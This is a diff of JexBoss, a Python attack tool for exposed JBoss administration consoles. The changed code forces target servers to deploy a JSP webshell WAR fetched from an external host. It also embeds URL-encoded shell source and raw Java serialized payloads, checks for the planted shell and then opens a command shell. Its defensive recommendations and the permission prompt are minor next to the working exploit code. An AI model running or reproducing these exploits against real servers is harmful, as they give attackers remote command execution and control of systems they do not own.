@@ -1,7 +1,8 @@
 # coding: utf-8
 # JexBoss v1.0. @autor: João Filho Matos Figueiredo (joaomatosf@gmail.com)
-# Divulgação e modificação livres, desde que preservada a autoria.
-# Para atualizações, consulte: 
+# Updates: https://github.com/joaomatosf/jexboss
+# Distribution and modifications free, since it preserves the authoring
+
 
 import httplib, sys, urllib, os, time
 from urllib import urlencode
@@ -42,6 +43,22 @@ def getConnection(url):
 		return httplib.HTTPSConnection(getHost(url), getPort(url))
 	else:
 		return httplib.HTTPConnection(getHost(url), getPort(url))
+		
+
+def getSuccessfully(url, path):
+		result = 404
+		time.sleep(5)
+		conn = getConnection(url)
+		conn.request("GET", path)
+		result = conn.getresponse().status
+		if result == 404:
+			conn.close()
+			time.sleep(7)
+			conn = getConnection(url)
+			conn.request("GET", path)
+			result = conn.getresponse().status
+			conn.close()
+		return result
 
 def checkVul(url):
 	
@@ -69,8 +86,12 @@ def checkVul(url):
 
 def autoExploit(url, type):
 	
-	print GREEN + ("\n * Sending exploit code to %s. Wait...\n"
-				   "   (OBS: exploit developed and tested for versions <= 6.1.0.Final)" %url)
+	# exploitJmxConsoleFileRepository: tested and working in jboss 4 and 5
+	# exploitJmxConsoleMainDeploy:	   tested and working in jboss 4 and 6
+	# exploitWebConsoleInvoker:		   tested and working in jboss 4
+	# exploitJMXInvokerFileRepository: tested and working in jboss 4 and 5
+	
+	print GREEN + ("\n * Sending exploit code to %s. Wait...\n" %url)
 	result = 505
 	if type == "jmx-console":
 		result = exploitJmxConsoleFileRepository(url)
@@ -79,7 +100,7 @@ def autoExploit(url, type):
 	elif type == "web-console":
 		result = exploitWebConsoleInvoker(url)
 	elif type == "JMXInvokerServlet":
-		result = exploitInvokerJMX(url)
+		result = exploitJMXInvokerFileRepository(url)
 
 	if result == 200 or result == 500:
 		print GREEN + " * Successfully deployed code! Starting command shell, wait...\n" + ENDC
@@ -132,20 +153,25 @@ def shell_http(url, type):
 		conn.close()
 
 def exploitJmxConsoleMainDeploy(url):
+	# MainDeployer
+	# does not work in jboss5 (bug in jboss5)
 	# shell in link
 	# /jmx-console/HtmlAdaptor
-	jsp = "http://github.com/joaomatosf/jexboss/blob/master/util/jbossass.war"
+	jsp = "http://www.joaomatosf.com/rnp/jbossass.war"
 	payload =(  "/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service"
 				"=MainDeployer&methodIndex=19&arg0="+jsp)
-	print ( GREEN+ " * Info: Essa exploração tentará forçar o servidor a implantar o webshell"
-			       "\n   hospedado no link: "+jsp +ENDC)
+	print ( GREEN+ "\n * Info: This exploit will force the server to deploy the webshell "
+			       "\n   available on: "+jsp +ENDC)
 	conn = getConnection(url)
 	conn.request("HEAD", payload)
 	result = conn.getresponse().status
 	conn.close()
-	return result	
+	return getSuccessfully(url, "/jbossass/jbossass.jsp")	
 
 def exploitJmxConsoleFileRepository(url):
+		# DeploymentFileRepository
+		# tested and work in jboss4, 5.
+		# doest not work in jboss6
 		# shell jsp
 		# /jmx-console/HtmlAdaptor
 		jsp =("%3C%25%40%20%70%61%67%65%20%69%6D%70%6F%72%74%3D%22%6A%61%76%61"
@@ -176,10 +202,10 @@ def exploitJmxConsoleFileRepository(url):
 		conn.request("HEAD", payload)
 		result = conn.getresponse().status
 		conn.close()
-		return result
+		return getSuccessfully(url, "/jbossass/jbossass.jsp")
 		
-def exploitInvokerJMX(url):
-	# CVE-2012-0874
+def exploitJMXInvokerFileRepository(url):
+	# tested and work in jboss4, 5
 	# MainDeploy, shell in data
 	# /invoker/JMXInvokerServlet
 	payload = ( "\xac\xed\x00\x05\x73\x72\x00\x29\x6f\x72\x67\x2e\x6a\x62\x6f\x73"
@@ -260,14 +286,15 @@ def exploitInvokerJMX(url):
 	if response.read().count("Failed") > 0:
 		result = 505
 	conn.close
-	return result
+	return getSuccessfully(url, "/shellinvoker/shellinvoker.jsp")
 	
 def exploitWebConsoleInvoker(url):
+	# does not work in jboss5 (bug in jboss5)
 	# MainDeploy, shell in link
-	# /admin-console/Invoker
-	jsp = "http://github.com/joaomatosf/jexboss/blob/master/util/jbossass.war"
-	jsp = "\\x".join("{:02x}".format(ord(c)) for c in jsp)
-	jsp = "\\x" + jsp
+	# /web-console/Invoker
+	#jsp = "http://www.joaomatosf.com/rnp/jbossass.war"
+	#jsp = "\\x".join("{:02x}".format(ord(c)) for c in jsp)
+	#jsp = "\\x" + jsp
 	payload = ( "\xac\xed\x00\x05\x73\x72\x00\x2e\x6f\x72\x67\x2e"
 				"\x6a\x62\x6f\x73\x73\x2e\x63\x6f\x6e\x73\x6f\x6c\x65\x2e\x72\x65"
 				"\x6d\x6f\x74\x65\x2e\x52\x65\x6d\x6f\x74\x65\x4d\x42\x65\x61\x6e"
@@ -285,7 +312,13 @@ def exploitWebConsoleInvoker(url):
 				"\x64\x65\x70\x6c\x6f\x79\x75\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61"
 				"\x2e\x6c\x61\x6e\x67\x2e\x4f\x62\x6a\x65\x63\x74\x3b\x90\xce\x58"
 				"\x9f\x10\x73\x29\x6c\x02\x00\x00\x78\x70\x00\x00\x00\x01\x74\x00"
-				"\x2a%s\x75\x72\x00\x13\x5b"
+				"\x2a"
+				#link
+				"\x68\x74\x74\x70\x3a\x2f\x2f\x77\x77\x77\x2e\x6a\x6f\x61\x6f\x6d\x61"
+				"\x74\x6f\x73\x66\x2e\x63\x6f\x6d\x2f\x72\x6e\x70\x2f\x6a\x62\x6f"
+				"\x73\x73\x61\x73\x73\x2e\x77\x61\x72"
+				#end
+				"\x75\x72\x00\x13\x5b"
 				"\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x72\x69\x6e"
 				"\x67\x3b\xad\xd2\x56\xe7\xe9\x1d\x7b\x47\x02\x00\x00\x78\x70\x00"
 				"\x00\x00\x01\x74\x00\x10\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e"
@@ -294,8 +327,7 @@ def exploitWebConsoleInvoker(url):
 				"\x74\x4e\x61\x6d\x65\x0f\x03\xa7\x1b\xeb\x6d\x15\xcf\x03\x00\x00"
 				"\x78\x70\x74\x00\x21\x6a\x62\x6f\x73\x73\x2e\x73\x79\x73\x74\x65"
 				"\x6d\x3a\x73\x65\x72\x76\x69\x63\x65\x3d\x4d\x61\x69\x6e\x44\x65"
-				"\x70\x6c\x6f\x79\x65\x72\x78" %jsp)
-	print payload
+				"\x70\x6c\x6f\x79\x65\x72\x78")
 	conn = getConnection(url)
 	headers = { "Content-Type" : "application/x-java-serialized-object; class=org.jboss.console.remote.RemoteMBeanInvocation",
 				"Accept"  : "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2"}
@@ -308,10 +340,8 @@ def exploitWebConsoleInvoker(url):
 		conn.request("HEAD", "/web-console/Invoker", payload, headers)
 		response = conn.getresponse()
 		result = response.status
-	if response.read().count("Failed") > 0:
-		result = 505
 	conn.close
-	return result
+	return getSuccessfully(url, "/jbossass/jbossass.jsp")
 
 	
 def clear():
@@ -366,7 +396,7 @@ mapResult = checkVul(url)
 # performs exploitation
 for i in ["jmx-console", "web-console", "JMXInvokerServlet"]:
 	if mapResult[i] == 200 or mapResult[i] == 500:
-		print BLUE + ("\n * Do you want to try to run an automated exploitation via \""+BOLD+i+NORMAL+"\" ?\n"
+		print BLUE + ("\n\n * Do you want to try to run an automated exploitation via \""+BOLD+i+NORMAL+"\" ?\n"
 			   	      "   This operation will provide a simple command shell to execute commands on the server..\n"
 			   	 +RED+"   Continue only if you have permission!" +ENDC)
 		if raw_input("   yes/NO ? ").lower() == "yes":
@@ -375,7 +405,7 @@ for i in ["jmx-console", "web-console", "JMXInvokerServlet"]:
 # resume results
 if mapResult.values().count(200) > 0:
 	banner()
-	print RED+ "\n Results: potentially compromised server!" +ENDC
+	print RED+ " Results: potentially compromised server!" +ENDC
 	print (GREEN+" * - - - - - - -  - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -*\n\n"
 			  " Recommendations: \n"
 			  " - Remove web consoles and services that are not used, eg:\n"
@@ -386,7 +416,10 @@ if mapResult.values().count(200) > 0:
 			  "    $ rm admin-console.war\n"
 			  " - Use a reverse proxy (eg. nginx, apache, f5)\n"
 			  " - Limit access to the server only via reverse proxy (eg. DROP INPUT POLICY)\n"
-			  " - Search vestiges of exploitation within the directories \"deploy\" or \"management\".\n"
+			  " - Search vestiges of exploitation within the directories \"deploy\" or \"management\".\n\n"
+			  " References:\n"
+			  "   [1] - https://developer.jboss.org/wiki/SecureTheJmxConsole\n"
+			  "   [2] - https://issues.jboss.org/secure/attachment/12313982/jboss-securejmx.pdf\n"
 			  "\n"
 			  " - If possible, discard this server!\n\n"
 			  " * - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -*\n" )
@@ -395,9 +428,9 @@ elif mapResult.values().count(505) == 0:
 			"   The server is not vulnerable to bugs tested ... :D\n\n" + ENDC)
 
 # infos	
-print (ENDC+"\n * Info: review, suggestions, updates, etc: \n"
+print (ENDC+" * Info: review, suggestions, updates, etc: \n"
 			 "   https://github.com/joaomatosf/jexboss\n"
-			 "   joaomatosf@gmail.com\n\n\n")
+			 "   joaomatosf@gmail.com\n")
 
 print ENDC
 
